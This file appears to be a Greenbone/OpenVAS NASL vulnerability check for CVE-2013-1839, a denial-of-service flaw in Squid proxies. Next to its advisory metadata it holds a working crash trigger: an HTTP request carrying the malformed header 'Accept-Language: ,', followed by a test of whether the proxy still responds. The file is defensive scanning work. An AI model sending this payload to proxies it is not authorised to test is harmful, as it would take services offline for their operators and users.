# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:squid-cache:squid";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802062");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2013-1839");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-10-03 18:01:36 +0530 (Thu, 03 Oct 2013)");
  script_name("Squid Accept-Language Header DoS Vulnerability (SQUID-2013:1)");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_squid_http_detect.nasl");
  script_mandatory_keys("squid/http/detected");
  script_require_ports("Services/www", "Services/http_proxy", 3128);

  script_xref(name:"URL", value:"http://secunia.com/advisories/52588");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58316");
  script_xref(name:"URL", value:"http://www.squid-cache.org/Advisories/SQUID-2013_1.txt");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2013/03/11/7");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/525932/30/30/threaded");

  script_tag(name:"summary", value:"Squid is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send crafted 'Accept-Language' header request and check is it
  vulnerable to DoS.");

  script_tag(name:"solution", value:"Update to version 3.2.9, 3.3.3 or later.");

  script_tag(name:"insight", value:"Error within the 'strHdrAcptLangGetItem()' function in
  errorpage.cc when handling the 'Accept-Language' header.");

  script_tag(name:"affected", value:"Squid version 3.2.x before 3.2.9 and 3.3.x before 3.3.3.");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to cause a
  denial of service via a crafted 'Accept-Language' header.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

normal_req = http_get(item:"http://www.$$$$$", port:port);
normal_res = http_send_recv(port:port, data:normal_req);

if(!normal_res || "Server: squid" >!< normal_res)
  exit(0);

crafted_req = string("GET http://testhostdoesnotexists.com:1234 HTTP/1.1\r\n",
                     "Accept-Language: ,", "\r\n", "\r\n");
crafted_res = http_send_recv(port:port, data:crafted_req);

normal_res = http_send_recv(port:port, data:normal_req);
if(!normal_res) {
  security_message(port:port);
  exit(0);
}

exit(99);
